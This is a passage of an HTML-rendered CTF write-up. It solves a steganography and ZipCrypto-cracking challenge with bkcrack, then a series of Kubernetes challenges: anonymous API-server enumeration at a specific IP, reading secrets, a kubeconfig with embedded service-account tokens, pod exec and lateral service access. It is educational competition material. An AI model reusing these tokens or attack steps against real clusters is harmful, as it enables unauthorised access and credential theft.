class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> string </span><br><span class=\"line\">im1=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;tobi.jpg&quot;</span>)</span><br><span class=\"line\">im2=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;tobi.png&quot;</span>)</span><br><span class=\"line\">pix2=im2.load()</span><br><span class=\"line\">pix1=im1.load()</span><br><span class=\"line\">width,height=im1.size</span><br><span class=\"line\">result=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">data=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,width):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,height):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> pix1[i,j] != pix2[i,j] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">0</span>] != pix2[i,j][<span class=\"number\">0</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">1</span>] != pix2[i,j][<span class=\"number\">1</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">2</span>] != pix2[i,j][<span class=\"number\">2</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">3</span>):</span><br><span class=\"line\">                data.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">abs</span>(pix1[i,j][k] - pix2[i,j][k])))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> char <span class=\"keyword\">in</span> string.ascii_letters + string.digits + string.punctuation:</span><br><span class=\"line\">        result+=char</span><br><span class=\"line\"></span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br></pre></td></tr></table></figure>\n<p>So the logic behind that code is to extract the pixels that have a full difference then calculate the difference between them. After that we convert the numbers to chars (should be printable!)</p>\n<p>This expression will give us the different pixels</p>\n<figure class=\"highlight python\"><figcaption><span>exp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pix1[i,j] != pix2[i,j] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">0</span>] != pix2[i,j][<span class=\"number\">0</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">1</span>] != pix2[i,j][<span class=\"number\">1</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">2</span>] != pix2[i,j][<span class=\"number\">2</span>]</span><br></pre></td></tr></table></figure>\n<p>In addition this expression collect the result of calculation the diff between the 2 pixels of each image!</p>\n<figure class=\"highlight python\"><figcaption><span>diff</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">abs</span>(pix1[i,j][k] - pix2[i,j][k])))</span><br></pre></td></tr></table></figure>\n<p>Then it’s time to convert it to printable data!</p>\n<figure class=\"highlight python\"><figcaption><span>print</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> char <span class=\"keyword\">in</span> string.ascii_letters + string.digits + string.punctuation:</span><br><span class=\"line\">        result+=char</span><br></pre></td></tr></table></figure>\n<p>Running this code will give you this base64 encoding!  <code>dGgxNV8xNV9zaDB1TGRfYjNfaDRyRA==</code></p>\n<p>Bingo we got this statement!  <code>th15_15_sh0uLd_b3_h4rD</code> . Let’s wrap it in Securinets! Oh nooo! Didn’t work. I guess the challenge is not finished!</p>\n<p>We have 2 images! PNG and JPEG. Mmmm Let’s try to do some steganography on these images using the password/key that we got previously.</p>\n<p>The 1st idea in my mind is to try steghide! Nothing else! Let’s try it</p>\n<p><img data-src=\"https://imgur.com/VLbBAGf.png\" alt=\"\"></p>\n<p>YEEES MAAN! We got a flag.zip file! But wait it’s protected again 😦. I tried to brute force that thing using rockyou but failed !!! What is going on here! The flag is inside that zip what we should to do now!</p>\n<p>Let’s extract more information about the zip using  <code>7z</code>  utility</p>\n<figure class=\"highlight bash\"><figcaption><span>7z</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7z l  -slt flag.zip</span><br><span class=\"line\"></span><br><span class=\"line\">Path = flag.txt</span><br><span class=\"line\">Folder = -</span><br><span class=\"line\">Size = 40</span><br><span class=\"line\">Packed Size = 52</span><br><span class=\"line\">Modified = 2022-11-18 21:17:23</span><br><span class=\"line\">Created =</span><br><span class=\"line\">Accessed =</span><br><span class=\"line\">Attributes = A</span><br><span class=\"line\">Encrypted = +</span><br><span class=\"line\">Comment =</span><br><span class=\"line\">CRC = 4F639BBA</span><br><span class=\"line\">Method = ZipCrypto Store</span><br><span class=\"line\">Host OS = FAT</span><br><span class=\"line\">Version = 20</span><br><span class=\"line\">Volume Index = 0</span><br></pre></td></tr></table></figure>\n<p>Nice the flag.txt size is 40 bytes! So our flag is 40-chars strings! The encryption method is  <code>ZipCrypto</code> !</p>\n<p>Bingoo! This method is vulnerable! Let’s check how can we get our flag!</p>\n<p>After some searching we found a repository talking about “Crack legacy zip encryption with Biham and Kocher’s known plaintext attack.”</p>\n<p>I recommend to check this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tpbWNpODYvYmtjcmFjaw==\">repo</span> and understand how this attack can be manipulated and how to install that tool!</p>\n<p>Let’s now start downloading the tool</p>\n<figure class=\"highlight bash\"><figcaption><span>wget</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/kimci86/bkcrack/releases/download/v1.5.0/bkcrack-1.5.0-Linux.tar.gz</span><br></pre></td></tr></table></figure>\n<p>We need to recover the internal key that will allow us to extract the file!</p>\n<p>The attack requires at least 12 bytes of known plaintext. At least 8 of them must be contiguous. The larger the contiguous known plaintext, the faster the attack. In our case we have a flag.txt that contains  <code>Securinets&#123;*&#125;</code></p>\n<p>In our case we know 11 chars ( <code>Securinets&#123;</code> ) and the last char  <code>&#125;</code></p>\n<p>Let’s recover our key now!</p>\n<figure class=\"highlight bash\"><figcaption><span>prepare our data</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;Securinets&#123;&quot;</span> &gt; plaintext.txt</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;&#125;&quot;</span> | xxd <span class=\"comment\"># 7d is the result</span></span><br></pre></td></tr></table></figure>\n<p>The attack requires the plain text content and in case there is another seperate bytes we can specify the offset and the byte value in hex</p>\n<p>Now time to work !</p>\n<figure class=\"highlight bash\"><figcaption><span>get the key</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack-1.5.0-Linux/bkcrack -C flag.zip -c flag.txt -p plaintext.txt -x 39 7d </span><br><span class=\"line\"></span><br><span class=\"line\">bkcrack 1.5.0 - 2022-07-07</span><br><span class=\"line\">[16:21:19] Z reduction using 4 bytes of known plaintext</span><br><span class=\"line\">100.0 % (4 / 4)</span><br><span class=\"line\">[16:21:19] Attack on 1405963 Z values at index 6</span><br><span class=\"line\">Keys: 184a904b d4557686 2222c7f2</span><br><span class=\"line\">9.2 % (129555 / 1405963)</span><br><span class=\"line\">[16:24:40] Keys</span><br><span class=\"line\">184a904b d4557686 2222c7f2</span><br></pre></td></tr></table></figure>\n<p>We got the keys !  <code>184a904b d4557686 2222c7f2</code> . Now we can decipher/decrypt the file! which means extract it from the zip!</p>\n<figure class=\"highlight bash\"><figcaption><span>extract</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack-1.5.0-Linux/bkcrack -C flag.zip -c flag.txt -k 184a904b d4557686 2222c7f2 -d my_flag.txt   </span><br><span class=\"line\"></span><br><span class=\"line\">bkcrack 1.5.0 - 2022-07-07</span><br><span class=\"line\">[16:32:25] Writing deciphered data my_flag.txt (maybe compressed)</span><br><span class=\"line\">Wrote deciphered data.</span><br></pre></td></tr></table></figure>\n<p>Bingo We got the flag!!! How 2 images can hide data like that!</p>\n<p><img data-src=\"https://imgur.com/O8uXhZV.png\" alt=\"\"></p>\n<p>Flag:  <code>Securinets&#123;Z1p_CRyPt0_&amp;_5t3gH1d3_1s_BAd&#125;</code></p>\n<h1 id=\"kubernetes-challenge-serie\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-challenge-serie\">#</a> Kubernetes challenge serie</h1>\n<p>NCSC’2023 consider the 1st tunisian CTF competition that have a whole Kubernetes Category! These are oriented for beginners/Intermediate users to consodilate their basic knowledge in Kubernetes!</p>\n<p><img data-src=\"https://imgur.com/U69KQtM.png\" alt=\"\"></p>\n<h2 id=\"kubernetes-secrets\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-secrets\">#</a> Kubernetes: Secrets:</h2>\n<p>In this challenge we get an IP and the author told us that he have a secret in the cluster!<br>\n<img data-src=\"https://imgur.com/PCmO273.png\" alt=\"\"></p>\n<p>Visiting the IP on the browser will lead us to the author page! This is not our objective!</p>\n<p>We need to access to the API-Server. Let’s check the default port 6443</p>\n<figure class=\"highlight bash\"><figcaption><span>curl</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sk https://20.169.73.19:6443/version</span><br></pre></td></tr></table></figure>\n<p>And this request is failed! Mmmm The author change the default api-server?? Nmap time! Let’s scan that IP!</p>\n<p>After checking the IP we get that port opened 7443!</p>\n<p><img data-src=\"https://imgur.com/GunNYhA.png\" alt=\"\"></p>\n<p>And Yes! We got a response! It’s KUBERNETES TIME!!</p>\n<p>Let’s check what permission we have as an anonymous users! To be honest I’ll try to check if I can got namespaces Or secrets first! Let me check that!</p>\n<figure class=\"highlight bash\"><figcaption><span>curl-namespaces</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sk https://20.169.73.19:7443/api/v1/namespaces | grep <span class=\"string\">&#x27;&quot;name&quot;: &quot;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>And we got a list of namespaces! This is cool! We have  <code>task1,task2,task3 and task4</code>  namespaces! I bet that each challenge is in single namespace! This is Great!<br>\n<img data-src=\"https://imgur.com/vZrtZLd.png\" alt=\"\"></p>\n<p>Hummm We need secrets and this is the 1st challenge! So We are sure that we can list the secrets in the  <code>task1</code>  namespace!</p>\n<figure class=\"highlight bash\"><figcaption><span>curl-namespaces</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sk https://20.169.73.19:7443/api/v1/namespaces/task1/secrets</span><br></pre></td></tr></table></figure>\n<p>Bingo We got the Secrets List! We are on the right way!<br>\n<img data-src=\"https://imgur.com/0PFJsCI.png\" alt=\"\"></p>\n<p>Flag :  <code>Securinets&#123;S3crEts_Ar3_S0_CriT1c4LL&#125;</code></p>\n<blockquote>\n<p>We got a message! We must check it for sure!</p>\n</blockquote>\n<p>Look what we got here !</p>\n<figure class=\"highlight text\"><figcaption><span>check</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Look here YOU will need this one believe me!!!</span><br><span class=\"line\"> eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg</span><br></pre></td></tr></table></figure>\n<h2 id=\"kubernetes-pody\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-pody\">#</a> Kubernetes: Pody:</h2>\n<p>After getting the secrets we can move to the next challenge that named  <code>Pody</code></p>\n<p><img data-src=\"https://imgur.com/hZQya2W.png\" alt=\"\"></p>\n<p>In this challenge the author told us that the container is inside a pod! So how can we get inside that pod? Thinking a little bit we didn’t get any solution expect opening a shell session inside the pod!</p>\n<p>Kubectl Are you there?? Yes! It’s Kubectl time! I love to work with kubectl I will not waste my time curling endpoints 😃 So I’ll make my kubeconfig file for this challenge!</p>\n<p>When I checked the secrets in the previous challenge I got the certificate authority Certifcate. And of course don’t forget the token that we got!</p>\n<blockquote>\n<p>This token is used for authentication and authorization in kubernetes. This authorization is occur on the api-server level not the etcd!</p>\n</blockquote>\n<p>Let’s make our kubeconfig! But wait! In case you don’t have kubectl, it’s time to install it! You can follow this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvdGFza3MvdG9vbHMvaW5zdGFsbC1rdWJlY3RsLWxpbnV4Lw==\">guide</span> to install it</p>\n<figure class=\"highlight yaml\"><figcaption><span>kubeconfig</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Config</span></span><br><span class=\"line\"><span class=\"attr\">clusters:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">cluster:</span></span><br><span class=\"line\">    <span class=\"attr\">certificate-authority-data:</span>  <span class=\"string\">LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJek1ETXdOVEV5TWpVMU1sb1hEVE16TURNd01qRXlNalUxTWxvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTDEzCm0rOG5ySVlXU21hQjREMU9yWWJVS1hycE4rS2ZUZDk1TjA2UTQ5U3IyUU1FZkZXZHhjSGJadThRVWRIVXo1dFcKdmVvRnk4cFBpcmhhNHdGYnJEbXczdFp4NlgxbGxEZlp4b29jd1ZBOS9pMTBjNGE4TURvOGVuc1hlYWU1TytZcQpMZmdiM04zcWZYYjZmSHAzekwxeHJzWThPUEZVeHhmU3AxaElXa0RNZ0tZY0lhU2NoRVUzYTk0ZityY2tIOUFwCnltRi95TlB3bXgyU1RFZUVFSkZoZFdWUzVVamdSTmxnNzFPWklyb05DMXMzWEJxb2RiZ1FWUjBUeTI5bnJGc0QKQnBJQW1WQVRCS3QxTjcyRjRMRDA0c3M3QVUxU0NDSCtoUmlrTWE1ZkdtOTBjMWRacEVuZ1IyVEUwSzZ4WVY3TAplOElrcE5WOVBaLy9RT2ZqSnFFQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZBWWUzVktNRDY3T3V5NWhWTGxTN0RWeU52SExNQlVHQTFVZEVRUU8KTUF5Q0NtdDFZbVZ5Ym1WMFpYTXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBSE9EMUNTNGQzNjJLRXE1dTZyQwpQOEF6a3hDMTJDdVF1bDh4aUVTajZ4M25wb25oT2M3WU0zRUhQZk5wNHRDZmNsdFpDMU51SXNrVDRuSkRLRTFYCjRNVFNOL0kxVDlGSHd5SUhNbDZMZm1RL1ZLVlo1YlZJMEZlUENQanFnOWZSbHFYaitsRUxJQnRJVE0xbUlmeW0KZlZmMisrS3h4OTFTME54bWRKUzU0amY1SUJMRVh2SnRiWFYrblZ1ekhER3l5eDREblVDMm4zR3NrcEtBOGRJRQpZZktRWk5IZjJ4L0FySWM2a3A0em9TSWI1RVQvdDk4b3p5R2pldlVnbDd1L0orUzkwTS9pWWgyaGlGSXRRVE1WCnBTa0pQM1lIbDlzWVRSS0dXZTBtcEtnVm1RZm9VTVNzdURrRnZ4ZFNhVG9QQUN6aUdxdUNnVXVyWHMxNXJjOWkKR2xBPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==</span></span><br><span class=\"line\">    <span class=\"attr\">server:</span> <span class=\"string\">https://20.169.73.19:7443</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">raf-k8s</span></span><br><span class=\"line\"><span class=\"attr\">contexts:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">context:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">ncsc-sa@raf-k8s</span></span><br><span class=\"line\">  <span class=\"attr\">context:</span></span><br><span class=\"line\">    <span class=\"attr\">cluster:</span> <span class=\"string\">raf-k8s</span></span><br><span class=\"line\">    <span class=\"attr\">user:</span> <span class=\"string\">ncsc-sa</span></span><br><span class=\"line\"><span class=\"attr\">current-context:</span> <span class=\"string\">ncsc-sa@raf-k8s</span></span><br><span class=\"line\"><span class=\"attr\">users:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">ncsc-sa</span></span><br><span class=\"line\">  <span class=\"attr\">user:</span></span><br><span class=\"line\">    <span class=\"attr\">token:</span> <span class=\"string\">eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg</span></span><br></pre></td></tr></table></figure>\n<p>This kubeconfig file will allow us to authenticate to the api-server using kubectl utility without wasting time specifying the token and other stuff!</p>\n<p>Assume that you save that file in name  <code>ncsc-k8s.conf</code> . Let’s export the KUBECONFIG env var.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">export</span> KUBECONFIG=ncsc-k8s.conf</span><br><span class=\"line\">$ kubectl get pods -n task2 </span><br><span class=\"line\">NAME      READY   STATUS    RESTARTS        AGE</span><br><span class=\"line\">web-app   1/1     Running   3 (2d19h ago)   17d</span><br></pre></td></tr></table></figure>\n<p>Bingo !! We got access and everything is ok until now. Let’s describe the pod and check what we have first before getting a shell !</p>\n<figure class=\"highlight bash\"><figcaption><span>describe pod</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl describe pod web-app -n task2   </span><br><span class=\"line\">Name:             web-app</span><br><span class=\"line\">Namespace:        task2</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">    Mounts:</span><br><span class=\"line\">      /etc/nginx/flag.txt from flag-configmap (rw,path=<span class=\"string\">&quot;flag.txt&quot;</span>)</span><br><span class=\"line\">      /var/cache/nginx from tmpfs-2 (rw)</span><br><span class=\"line\">      /var/run from tmpfs-1 (rw)</span><br><span class=\"line\">      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-wrfpc (ro)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>Wow there is  <code>flag.txt</code>  file inside the pod! Let’s be more accurate! The flag is in  <code>/etc/nginx/flag.txt</code></p>\n<p>Let’s get a shell or run a command from the pod using the  <code>kubectl exec</code>  command!</p>\n<p><img data-src=\"https://imgur.com/6QTqehO.png\" alt=\"\"></p>\n<p>Yes we got the flag! And another message: Your current token is enough!</p>\n<blockquote>\n<p>I tried to delete the flag! But as expected the author make the pod Read-only file system</p>\n</blockquote>\n<p>Flag :  <code>Securinets&#123;Ex3c_1s_DAnGer0uS_B3_C4r3fUL&#125;</code></p>\n<h2 id=\"kubernetes-hidden\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-hidden\">#</a> Kubernetes: Hidden? :</h2>\n<p>We still have the same token! Our kubectl works fine. So no worries we can do it!</p>\n<p><img data-src=\"https://imgur.com/1Eny78d.png\" alt=\"\"></p>\n<p>In this challenge the flag is hidden?? But how!? Let’s check first what can we do in our  <code>task3</code>  namespace</p>\n<figure class=\"highlight bash\"><figcaption><span>service</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl get service -n task3        </span><br><span class=\"line\">NAME      TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE</span><br><span class=\"line\">web-app   ClusterIP   10.109.128.98   &lt;none&gt;        80/TCP    17d</span><br></pre></td></tr></table></figure>\n<p>We can access to services! In case you don’t know what is service I recommend to check this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvY29uY2VwdHMvc2VydmljZXMtbmV0d29ya2luZy9zZXJ2aWNlLw==\">page</span>. As we understand, There is a pod inside task3 namespace but we don’t have any access to it 😦!. No worries we still have services! This service as we can see its attached to that pod. Let’s get our flag!</p>\n<p>After a little bit of thinking, I got an idea! Let’s access to the service from our previous pod!</p>\n<p>YES MAN! pods and services can communicate between each others</p>\n<p><img data-src=\"https://imgur.com/uq3xAoV.png\" alt=\"\"></p>\n<p>Ok let’s do it then, we have the service internal IP and we can run curl command inside our previous pod!</p>\n<p><img data-src=\"https://imgur.com/DuPq2Sp.png\" alt=\"\"></p>\n<p>Bingo! Flag:  <code>Securinets&#123;K8s_S3rV1cEs_ArE_P0wErFull&#125;</code> <br>\nAnd as Usual! another token for the next challenge :</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In The Next Challenge You will Need This one!</span><br><span class=\"line\"> eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrNCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJuY3NjLXBhcnRpY2lwYW50LXRva2VuLTdnZ2JxIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6Im5jc2MtcGFydGljaXBhbnQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIwNmM3OGJhZC01NjAwLTQ2N2QtYjdhYi0wNWQzN2RjMjg0MzIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazQ6bmNzYy1wYXJ0aWNpcGFudCJ9.exWa8skN0HdscxzG2PBFYn9eU9l_sL7hAjUw8sFPsnjUKHPHzmqwDpN4WfSPCHFOfv7KKimYvr9SuMjB75KuapxXKnyBwEaIZEkH3c0lavBCPYfGou_BrVsAHVSdbw6pQ9YYonuc3WTiGkcXC-XjKXfY8PGppmnGh7gUsuxY9xwpju10PutjIs8s0g9z2tTBYUhOraa54WRCODDGw-o415rXsaVHuV8A2Cj3jQZVBzXXi5-snfvjX27-nMyGDh4F0gu8sXD3PZfLjLdrOQpP6s_jzbUN9G1g8iLQTXNjCvgUw2cnBOvWtRGLtbdizOazlKUyJAOSXfmu3W45bMJPOg</span><br></pre></td></tr></table></figure>\n<h2 id=\"kubernetes-special\"><a class=\"markdownIt-Anchor\" 